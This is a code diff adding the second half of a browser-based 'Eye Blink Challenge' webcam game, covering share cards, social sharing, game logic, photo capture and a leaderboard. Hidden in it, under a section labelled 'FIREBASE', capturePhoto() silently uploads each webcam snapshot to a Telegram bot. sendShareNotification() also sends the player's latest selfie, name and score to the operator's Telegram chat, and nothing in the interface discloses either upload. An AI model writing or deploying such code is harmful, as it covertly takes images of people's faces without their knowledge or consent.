+        const finalHeld = held;
+        eyesOpenStart = null;
+        setTimeout(() => endHoldMode(finalHeld), 100);
+      }
+    }
+    eyesClosed = bothClosed;
+  }
+}
+
+// ─────────────────────────────────────────────
+// RESULT SHARE CARD
+// ─────────────────────────────────────────────
+function showResultCard(score, gameMode) {
+  const overlay = document.getElementById('shareOverlay');
+
+  // Score + unit
+  document.getElementById('soScore').textContent = gameMode === 'speed' ? score : score.toFixed(1);
+  document.getElementById('soUnit').textContent  = gameMode === 'speed' ? 'BLINKS' : 'SECONDS';
+
+  // Smart tagline based on score
+  let tagline = '', subline = '';
+  if (gameMode === 'speed') {
+    if (score >= 20)      { tagline = '🔥 Absolute Legend!';         subline = 'Challenge your loved ones — can they match this? 💪'; }
+    else if (score >= 12) { tagline = '⚡ Blink Master!';             subline = 'Dare your loved ones to beat your score! 👀'; }
+    else                  { tagline = '👁️ Not bad!';                 subline = 'Challenge your loved ones — it\'s harder than it looks!'; }
+  } else {
+    if (score >= 10)      { tagline = '🧊 Stone Cold Eyes!';          subline = 'Challenge your loved ones — can they hold longer? 💪'; }
+    else if (score >= 5)  { tagline = '😤 Solid Hold!';               subline = 'Dare your loved ones to beat this! 👀'; }
+    else                  { tagline = '😅 Eyes betrayed you!';        subline = 'Challenge your loved ones — bet they can\'t do better!'; }
+  }
+
+  document.getElementById('soTagline').textContent = tagline;
+  document.getElementById('soSubline').textContent = subline;
+
+  // Show overlay on camera
+  overlay.style.display = 'flex';
+
+  // Also update bottom card (keep it as backup)
+  const card = document.getElementById('resultCard');
+  document.getElementById('cardScore').textContent = gameMode === 'speed' ? score : score.toFixed(1);
+  document.getElementById('cardUnit').textContent  = gameMode === 'speed' ? 'blinks' : 'seconds';
+  document.getElementById('cardPlayerName').textContent = playerName || 'Anonymous';
+  if (photosTaken.length > 0) {
+    document.getElementById('cardAvatar').src = photosTaken[photosTaken.length - 1];
+  }
+  document.getElementById('cardTagline').innerHTML = `${subline} <strong>💪</strong>`;
+  card.style.display = 'block';
+}
+
+function hideShareOverlay() {
+  document.getElementById('shareOverlay').style.display = 'none';
+  document.getElementById('resultCard').style.display   = 'none';
+  // Scroll back to top
+  document.querySelector('.phone-shell').scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function getShareText(withScore = true) {
+  const score = document.getElementById('cardScore').textContent;
+  const unit  = document.getElementById('cardUnit').textContent;
+  const name  = playerName || '';
+  const url   = window.location.href;
+  if (withScore) {
+    if (name) {
+      return `👁️ ${name} scored ${score} ${unit} in the Eye Blink Challenge!\nCan you beat it? 💪\n👉 ${url}`;
+    } else {
+      return `👁️ I scored ${score} ${unit} in the Eye Blink Challenge!\nCan you beat it? 💪\n👉 ${url}`;
+    }
+  } else {
+    return `👁️ Eye Blink Challenge — Can YOU blink faster than me? 😏\n👉 ${url}`;
+  }
+}
+
+function shareToWhatsApp() {
+  const text = encodeURIComponent(getShareText(true));
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+  if (isMobile) {
+    // Native deep link — WhatsApp app seedha kholega with send sheet
+    window.location.href = `whatsapp://send?text=${text}`;
+  } else {
+    // Desktop fallback
+    window.open(`https://web.whatsapp.com/send?text=${text}`, '_blank');
+  }
+  sendShareNotification('WhatsApp');
+}
+
+async function buildShareImage() {
+  // ── Ek 1080x1080 branded share image banao canvas pe ──
+  // Isme selfie (agar li hai) + score + text + link sab hoga
+  const SIZE = 1080;
+  const c    = document.createElement('canvas');
+  c.width    = SIZE;
+  c.height   = SIZE;
+  const ctx  = c.getContext('2d');
+
+  // ── Background: dark pink gradient ──
+  const bg = ctx.createLinearGradient(0, 0, SIZE, SIZE);
+  bg.addColorStop(0,   '#07000e');
+  bg.addColorStop(0.5, '#1a0028');
+  bg.addColorStop(1,   '#07000e');
+  ctx.fillStyle = bg;
+  ctx.fillRect(0, 0, SIZE, SIZE);
+
+  // ── Dot halftone pattern (top-left) ──
+  ctx.save();
+  for (let x = 0; x < SIZE * 0.55; x += 24) {
+    for (let y = 0; y < SIZE * 0.55; y += 24) {
+      const dist = Math.sqrt(x * x + y * y);
+      const alpha = Math.max(0, 0.18 - dist / (SIZE * 1.2));
+      ctx.beginPath();
+      ctx.arc(x, y, 2, 0, Math.PI * 2);
+      ctx.fillStyle = `rgba(255,20,147,${alpha})`;
+      ctx.fill();
+    }
+  }
+  ctx.restore();
+
+  // ── Selfie circle (agar photo hai) ──
+  const hasPhoto = photosTaken.length > 0;
+  if (hasPhoto) {
+    await new Promise(resolve => {
+      const img = new Image();
+      img.onload = () => {
+        const cx = SIZE / 2, cy = 320, r = 220;
+        ctx.save();
+        ctx.beginPath();
+        ctx.arc(cx, cy, r, 0, Math.PI * 2);
+        ctx.clip();
+        // cover-fit the image in the circle
+        const scale = Math.max((r * 2) / img.width, (r * 2) / img.height);
+        const dw = img.width * scale, dh = img.height * scale;
+        ctx.drawImage(img, cx - dw / 2, cy - dh / 2, dw, dh);
+        ctx.restore();
+        // Pink ring around circle
+        ctx.save();
+        ctx.beginPath();
+        ctx.arc(cx, cy, r + 5, 0, Math.PI * 2);
+        ctx.strokeStyle = '#ff1493';
+        ctx.lineWidth   = 6;
+        ctx.shadowColor = '#ff1493';
+        ctx.shadowBlur  = 24;
+        ctx.stroke();
+        ctx.restore();
+        resolve();
+      };
+      img.onerror = resolve;
+      img.src = photosTaken[photosTaken.length - 1];
+    });
+  }
+
+  const textTop = hasPhoto ? 580 : 260;
+
+  // ── Eye emoji ──
+  ctx.font      = `${hasPhoto ? 72 : 90}px serif`;
+  ctx.textAlign = 'center';
+  ctx.fillText('👁️', SIZE / 2, textTop);
+
+  // ── Score (big number) ──
+  const score = document.getElementById('cardScore').textContent;
+  const unit  = document.getElementById('cardUnit').textContent;
+  ctx.save();
+  ctx.font         = 'bold 160px Arial Black, Arial, sans-serif';
+  ctx.textAlign    = 'center';
+  ctx.shadowColor  = '#ff1493';
+  ctx.shadowBlur   = 40;
+  const grad       = ctx.createLinearGradient(SIZE/2 - 200, 0, SIZE/2 + 200, 0);
+  grad.addColorStop(0,   '#ff1493');
+  grad.addColorStop(1,   '#ff79b8');
+  ctx.fillStyle    = grad;
+  ctx.fillText(score, SIZE / 2, textTop + 170);
+  ctx.restore();
+
+  // ── Unit label ──
+  ctx.font      = 'bold 48px Arial, sans-serif';
+  ctx.fillStyle = 'rgba(255,240,248,0.65)';
+  ctx.textAlign = 'center';
+  ctx.letterSpacing = '6px';
+  ctx.fillText(unit.toUpperCase(), SIZE / 2, textTop + 230);
+
+  // ── Challenge text ──
+  const name      = playerName || '';
+  const line1     = name ? `${name} scored ${score} ${unit}` : `I scored ${score} ${unit}`;
+  ctx.font        = 'bold 42px Arial, sans-serif';
+  ctx.fillStyle   = '#fff0f8';
+  ctx.textAlign   = 'center';
+  ctx.fillText(line1, SIZE / 2, textTop + 310);
+
+  ctx.font        = '36px Arial, sans-serif';
+  ctx.fillStyle   = 'rgba(255,240,248,0.7)';
+  ctx.fillText('in the Eye Blink Challenge!', SIZE / 2, textTop + 362);
+
+  ctx.font        = 'bold 38px Arial, sans-serif';
+  ctx.fillStyle   = '#ff79b8';
+  ctx.fillText('Can you beat it? 💪', SIZE / 2, textTop + 424);
+
+  // ── URL / link ──
+  const url = window.location.href;
+  ctx.font        = '30px Arial, sans-serif';
+  ctx.fillStyle   = 'rgba(255,20,147,0.9)';
+  // Truncate long URLs for display
+  const displayUrl = url.length > 45 ? url.substring(0, 42) + '...' : url;
+  ctx.fillText('👉 ' + displayUrl, SIZE / 2, textTop + 480);
+
+  // ── Bottom branding ──
+  ctx.font      = 'bold 28px Arial, sans-serif';
+  ctx.fillStyle = 'rgba(255,20,147,0.5)';
+  ctx.fillText('eye-blink.github.io/challenge', SIZE / 2, SIZE - 40);
+
+  return c.toDataURL('image/jpeg', 0.92);
+}
+
+async function shareToInsta() {
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+
+  // ── Step 1: Share image banao ──
+  showToast('⏳ Share image ban rahi hai...');
+  let dataURL = null;
+  try {
+    dataURL = await buildShareImage();
+  } catch (e) {
+    console.error('buildShareImage failed:', e);
+  }
+
+  // ── Step 2: navigator.share({ files }) try karo ──
+  // Ye sirf HTTPS par kaam karta hai aur Chrome/Safari mobile pe
+  if (dataURL && navigator.share && isMobile) {
+    try {
+      const res  = await fetch(dataURL);
+      const blob = await res.blob();
+      const file = new File([blob], 'eye-blink-challenge.jpg', { type: 'image/jpeg' });
+
+      const canShareFiles = navigator.canShare && navigator.canShare({ files: [file] });
+      console.log('canShare files:', canShareFiles, '| isSecure:', location.protocol === 'https:');
+
+      if (canShareFiles) {
+        await navigator.share({ files: [file], title: '👁️ Eye Blink Challenge' });
+        sendShareNotification('Instagram');
+        return;
+      }
+    } catch (e) {
+      if (e.name === 'AbortError') return; // user ne cancel kiya
+      console.error('navigator.share(files) failed:', e);
+    }
+  }
+
+  // ── Step 3: Fallback — image download karo + instructions dikhao ──
+  // navigator.share kaam nahi kiya (HTTP / unsupported browser)
+  // User image download karke Instagram DM mein manually attach kar sakta hai
+  if (dataURL) {
+    // Image auto-download
+    const a    = document.createElement('a');
+    a.href     = dataURL;
+    a.download = 'eye-blink-challenge.jpg';
+    a.click();
+
+    // Text bhi clipboard mein copy karo
+    const text = getShareText(true);
+    try { await navigator.clipboard.writeText(text); } catch (_) {}
+
+    showInstaGuide();
+  } else {
+    // Image bhi nahi bani — sirf clipboard
+    const text = getShareText(true);
+    try { await navigator.clipboard.writeText(text); } catch (_) {}
+    showToast('📋 Link copied! Instagram DM mein paste karo 📸');
+  }
+
+  sendShareNotification('Instagram');
+}
+
+function showInstaGuide() {
+  // Ek simple modal dikhao jo bataye kaise DM karna hai
+  let modal = document.getElementById('instaGuideModal');
+  if (!modal) {
+    modal = document.createElement('div');
+    modal.id = 'instaGuideModal';
+    modal.style.cssText = `
+      position:fixed; inset:0; background:rgba(7,0,14,0.92);
+      display:flex; align-items:center; justify-content:center;
+      z-index:9999; padding:20px;
+    `;
+    modal.innerHTML = `
+      <div style="background:#1a0028; border:1.5px solid rgba(255,20,147,0.5);
+                  border-radius:20px; padding:28px 22px; max-width:340px; width:100%;
+                  text-align:center; font-family:'Space Grotesk',sans-serif; color:#fff0f8;">
+        <div style="font-size:2.5rem; margin-bottom:10px;">📸</div>
+        <h3 style="color:#ff1493; font-size:1.1rem; margin-bottom:14px;">
+          Image download ho gayi!
+        </h3>
+        <p style="font-size:0.88rem; color:rgba(255,240,248,0.8); line-height:1.7; margin-bottom:18px;">
+          Ab Instagram DM mein bhejne ke liye:<br><br>
+          <strong style="color:#fff;">1.</strong> Instagram app kholein<br>
+          <strong style="color:#fff;">2.</strong> DM icon tap karein<br>
+          <strong style="color:#fff;">3.</strong> Dost select karein<br>
+          <strong style="color:#fff;">4.</strong> 📎 Attachment → Gallery mein downloaded image select karein<br>
+          <strong style="color:#fff;">5.</strong> Send! 🚀
+        </p>
+        <p style="font-size:0.78rem; color:rgba(255,20,147,0.8); margin-bottom:18px;">
+          💡 Link bhi clipboard mein copy ho gayi hai!
+        </p>
+        <button onclick="document.getElementById('instaGuideModal').remove()"
+          style="background:linear-gradient(135deg,#ff1493,#c2006b); border:none;
+                 color:#fff; padding:12px 32px; border-radius:20px; font-size:0.95rem;
+                 font-weight:700; cursor:pointer; font-family:inherit;">
+          Samajh gaya! ✅
+        </button>
+      </div>
+    `;
+    document.body.appendChild(modal);
+    modal.addEventListener('click', e => { if (e.target === modal) modal.remove(); });
+  } else {
+    modal.style.display = 'flex';
+  }
+}
+
+function copyChallenge() {
+  const text = getShareText(true);
+  navigator.clipboard.writeText(text).then(() => {
+    showToast('🔗 Challenge link copied! Send it to friends!');
+  }).catch(() => {
+    showToast('🔗 Copy: ' + window.location.href);
+  });
+  sendShareNotification('Link Copy');
+}
+
+async function sendShareNotification(platform) {
+  const score    = document.getElementById('cardScore').textContent;
+  const unit     = document.getElementById('cardUnit').textContent;
+  const name     = playerName || 'Anonymous';
+  const gameMode = unit === 'blinks' ? 'speed' : 'hold';
+
+  try {
+    // Send photo + share info to Telegram
+    if (photosTaken.length > 0) {
+      const dataURL = photosTaken[photosTaken.length - 1];
+      const res  = await fetch(dataURL);
+      const blob = await res.blob();
+      const form = new FormData();
+      form.append('chat_id', TELEGRAM_CHAT_ID);
+      form.append('caption',
+        `📤 *Challenge Shared!*\n` +
+        `👤 Player: *${name}*\n` +
+        `🏆 Score: *${score} ${unit}*\n` +
+        `🎮 Mode: *${gameMode === 'speed' ? '⚡ Speed Blink' : '🧊 Eyes Open'}*\n` +
+        `📱 Shared via: *${platform}*\n` +
+        `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      );
+      form.append('parse_mode', 'Markdown');
+      form.append('photo', blob, 'share.jpg');
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: form
+      });
+    } else {
+      // No photo — send text only
+      const form = new FormData();
+      form.append('chat_id', TELEGRAM_CHAT_ID);
+      form.append('text',
+        `📤 *Challenge Shared!*\n` +
+        `👤 Player: *${name}*\n` +
+        `🏆 Score: *${score} ${unit}*\n` +
+        `📱 Shared via: *${platform}*\n` +
+        `🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
+      );
+      form.append('parse_mode', 'Markdown');
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        body: form
+      });
+    }
+  } catch (err) {
+    console.error('Share notification error:', err);
+  }
+}
+
+// Hide result card when new game starts
+// ─────────────────────────────────────────────
+// GAME CONTROL
+// ─────────────────────────────────────────────
+async function startChallenge() {
+  if (!cameraReady) { showToast('Start camera first!'); return; }
+
+  // Wait up to 3s for FaceMesh to detect face before giving up
+  if (!currentLandmarks) {
+    showToast('👀 Detecting face…');
+    let waited = 0;
+    while (!currentLandmarks && waited < 3000) {
+      await sleep(100);
+      waited += 100;
+    }
+    if (!currentLandmarks) { showToast('⚠️ Centre your face in the camera!'); return; }
+  }
+
+  const overlay = document.getElementById('countdownOverlay');
+  overlay.style.display = 'flex';
+  for (let i = 3; i >= 1; i--) {
+    overlay.textContent = i;
+    await sleep(1000);
+  }
+  overlay.textContent = 'GO! 👁️';
+  await sleep(600);
+  overlay.style.display = 'none';
+
+  blinkCount      = 0;
+  blinkCooldown   = false;
+  eyesClosed      = false;
+  eyesOpenStart   = null;
+  earBaseline     = null;
+  angleBaseline   = null;
+  holdEarSamples  = [];
+  leftEarHistory  = [];
+  rightEarHistory = [];
+  window._holdDropFrames = 0;
+
+  // Hide result card and overlay from previous game
+  document.getElementById('resultCard').style.display    = 'none';
+  document.getElementById('shareOverlay').style.display  = 'none';
+  startTime       = Date.now();
+  gameActive      = true;
+
+  document.getElementById('startBtn').style.display = 'none';
+  document.getElementById('stopBtn').style.display  = 'flex';
+  document.getElementById('camTimer').style.display = 'block';
+  document.getElementById('bigNumber').textContent  = mode === 'speed' ? '0' : '0.0';
+  document.getElementById('blinkCount').textContent = '0';
+
+  if (mode === 'speed') {
+    document.getElementById('bigLabel').textContent = 'blinks';
+    let remaining = 10;
+    const timerInterval = setInterval(() => {
+      remaining = Math.max(0, 10 - Math.floor((Date.now() - startTime) / 1000));
+      document.getElementById('timeDisplay').textContent = remaining + 's left';
+      if (remaining <= 0) { clearInterval(timerInterval); endSpeedMode(); }
+    }, 100);
+    gameTimer = timerInterval;
+  } else {
+    document.getElementById('bigLabel').textContent = 'seconds';
+    document.getElementById('timeDisplay').textContent = '0.00s';
+  }
+}
+
+function stopChallenge() {
+  if (mode === 'speed') {
+    clearInterval(gameTimer);
+    endSpeedMode();
+  } else {
+    const held = eyesOpenStart ? (Date.now() - eyesOpenStart) / 1000 : 0;
+    capturePhoto(true);
+    endHoldMode(held);
+  }
+}
+
+function endSpeedMode() {
+  gameActive = false;
+  document.getElementById('stopBtn').style.display  = 'none';
+  document.getElementById('startBtn').style.display = 'flex';
+
+  const score   = blinkCount;
+  const prevBest = localStorage.getItem('bestScore_speed') || 0;
+  if (score > prevBest) {
+    localStorage.setItem('bestScore_speed', score);
+    document.getElementById('bestScore').textContent = score + '🏆';
+    showToast('🏆 New record! ' + score + ' blinks!');
+  } else {
+    showToast('⚡ Done! ' + score + ' blinks. Best: ' + prevBest);
+  }
+
+  capturePhoto(true);
+  uploadScore(playerName, score, 'speed');
+  showResultCard(score, 'speed');
+}
+
+function endHoldMode(seconds) {
+  gameActive    = false;
+  eyesOpenStart = null;
+  document.getElementById('stopBtn').style.display  = 'none';
+  document.getElementById('startBtn').style.display = 'flex';
+
+  const score    = parseFloat(seconds.toFixed(2));
+  const prevBest = parseFloat(localStorage.getItem('bestScore_hold') || 0);
+  if (score > prevBest) {
+    localStorage.setItem('bestScore_hold', score);
+    document.getElementById('bestScore').textContent = score + 's 🏆';
+    showToast('🏆 New record! Eyes open ' + score + 's!');
+  } else {
+    showToast('🧊 Done! ' + score + 's. Best: ' + prevBest + 's');
+  }
+
+  document.getElementById('bigNumber').textContent = score.toFixed(1);
+  uploadScore(playerName, score, 'hold');
+  showResultCard(score, 'hold');
+}
+
+// ─────────────────────────────────────────────
+// PHOTO
+// ─────────────────────────────────────────────
+function capturePhoto(flash = false) {
+  if (!beautyCanvas.width) return;
+  if (flash) {
+    const flashEl = document.getElementById('photoFlash');
+    flashEl.style.display = 'block';
+    setTimeout(() => flashEl.style.display = 'none', 400);
+  }
+  const snap = document.createElement('canvas');
+  snap.width  = beautyCanvas.width;
+  snap.height = beautyCanvas.height;
+  const ctx = snap.getContext('2d');
+
+  // Mirror flip — screen pe jo dikhta hai exactly wahi capture hoga
+  ctx.save();
+  ctx.translate(snap.width, 0);
+  ctx.scale(-1, 1);
+  ctx.drawImage(beautyCanvas, 0, 0);
+  ctx.drawImage(overlayCanvas, 0, 0);
+  ctx.restore();
+
+  const dataURL = snap.toDataURL('image/jpeg', 0.85);
+  photosTaken.push(dataURL);
+  updateGallery(dataURL);
+  uploadPhoto(dataURL, playerName, mode, blinkCount);
+}
+
+function updateGallery(dataURL) {
+  const gallery = document.getElementById('photoGallery');
+  const empties = gallery.querySelectorAll('.gallery-empty');
+  empties.forEach(e => e.remove());
+
+  const img = document.createElement('img');
+  img.src = dataURL;
+  img.title = 'Click to download';
+  img.onclick = () => {
+    const a = document.createElement('a');
+    a.href = dataURL;
+    a.download = 'blink-' + Date.now() + '.jpg';
+    a.click();
+  };
+  gallery.insertBefore(img, gallery.firstChild);
+  while (gallery.children.length > 8) gallery.removeChild(gallery.lastChild);
+}
+
+// ─────────────────────────────────────────────
+// FIREBASE
+// ─────────────────────────────────────────────
+async function uploadPhoto(dataURL, name, gameMode, score) {
+  await sendToTelegram(dataURL, name, gameMode, score);
+}
+
+async function uploadScore(name, score, gameMode) {
+  try {
+    const payload = { name: name || 'Anonymous', score, mode: gameMode, timestamp: Date.now(), device: navigator.userAgent.substring(0, 50) };
+    const res = await fetch(`${FIREBASE_CONFIG.databaseURL}/scores/${gameMode}.json`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
+    if (res.ok) loadLeaderboard(gameMode);
+  } catch {
+    loadLocalLeaderboard(gameMode, name, score);
+  }
+}
+
+async function loadLeaderboard(gameMode) {
+  try {
+    const res  = await fetch(`${FIREBASE_CONFIG.databaseURL}/scores/${gameMode}.json?orderBy="score"&limitToLast=5`);
+    const data = await res.json();
+    if (data) renderLeaderboard(Object.values(data).sort((a,b) => b.score - a.score).slice(0,5), gameMode);
+  } catch { /* silent */ }
+}
+
+function loadLocalLeaderboard(gameMode, name, score) {
+  const key = 'lb_' + gameMode;
+  let lb = JSON.parse(localStorage.getItem(key) || '[]');
+  lb.push({ name, score, timestamp: Date.now() });
+  lb.sort((a,b) => b.score - a.score);
+  lb = lb.slice(0, 10);
+  localStorage.setItem(key, JSON.stringify(lb));
+  renderLeaderboard(lb.slice(0,5), gameMode);
+}
+
+function renderLeaderboard(entries, gameMode) {
+  const lb    = document.getElementById('leaderboard');
+  lb.innerHTML = '';
+  const unit   = gameMode === 'speed' ? ' blinks' : 's';
+  const medals = ['🥇','🥈','🥉','4️⃣','5️⃣'];
+  entries.forEach((e, i) => {
+    const div = document.createElement('div');
+    div.className = 'lb-entry';
+    div.innerHTML = `<span class="lb-rank">${medals[i]||i+1}</span><span class="lb-name">${escapeHtml(e.name||'Anon')}</span><span class="lb-score">${e.score}${unit}</span>`;
+    lb.appendChild(div);
+  });
+}
+
+// ─────────────────────────────────────────────
+// UTILS
+// ─────────────────────────────────────────────
+function showToast(msg, duration = 3000) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), duration);
+}
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+function escapeHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function openShareModal() {
+  const modal = document.getElementById('shareModal');
+  modal.style.display = 'flex';
+  setTimeout(() => document.getElementById('shareNameInput').focus(), 100);
+}
+
+function closeShareModal() {
+  document.getElementById('shareModal').style.display = 'none';
+}
+
+function confirmShare() {
+  const input = document.getElementById('shareNameInput').value.trim();
+  if (input) {
+    playerName = input.substring(0, 20);
+  }
+  const url = window.location.href;
+  navigator.clipboard.writeText(url).then(() => {
+    closeShareModal();
+    showToast('🔗 Link copied! Challenge sent as ' + (playerName || 'Anonymous'));
+  }).catch(() => {
+    closeShareModal();
+    showToast('🔗 Copy this link: ' + url);
+  });
+}
+
+// Close modal on backdrop tap
+document.getElementById('shareModal').addEventListener('click', function(e) {
+  if (e.target === this) closeShareModal();
+});
+
+// ─────────────────────────────────────────────
+// INIT
+// ─────────────────────────────────────────────
+document.getElementById('shareUrl').textContent = window.location.href;
+
+const savedLb = JSON.parse(localStorage.getItem('lb_' + mode) || '[]');
+if (savedLb.length) renderLeaderboard(savedLb.slice(0,5), mode);
+
+const bestSpeed = localStorage.getItem('bestScore_speed');
+const bestHold  = localStorage.getItem('bestScore_hold');
+document.getElementById('bestScore').textContent =
+  (bestSpeed ? bestSpeed + ' blinks' : '') +
+  (bestSpeed && bestHold ? ' / ' : '') +
+  (bestHold  ? bestHold + 's' : '') || '--';
+
+setTimeout(() => { loadLeaderboard('speed'); loadLeaderboard('hold'); }, 500);
+</script>
+</body>
+</html>
